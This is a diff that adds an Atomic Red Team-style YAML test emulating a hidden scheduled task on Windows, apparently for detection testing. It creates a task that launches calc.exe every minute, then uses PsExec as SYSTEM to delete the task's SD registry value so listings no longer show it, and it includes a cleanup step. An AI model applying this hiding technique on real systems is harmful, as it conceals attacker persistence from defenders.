@@ -1,0 +1,37 @@
+attack_technique: Hidden Schedule task
+display_name: Hidden Schedule task
+atomic_tests:
+- name: Hidden Schedule task
+  auto_generated_guid: 1a01e5ee-42ef-4be1-8bda-08bde9037433
+  description: |
+    Attacker deletes SD registry value of a specific schedule tasks to hide it from the task scheduler and rest of commands that display schedule tasks 
+  supported_platforms:
+    - windows
+  input_arguments:
+    psexec_exe:
+      description: Path to PsExec
+      type: string
+      default: C:\PSTools\PsExec.exe
+    HiddenTaskName:
+      description: Hidden Task name
+      type: string
+      default: Hidden      
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
+    prereq_command: |
+      if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
+      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+  executor:
+    command: |
+      schtasks /create /sc minute /mo 1 /tn #{HiddenTaskName} /tr calc.exe
+      #{psexec_exe} -i -s -d reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\hidden" /v SD /f
+    cleanup_command: |
+      #{psexec_exe} -i -s -d reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\hidden" /f
+    name: command_prompt
+    elevation_required: true
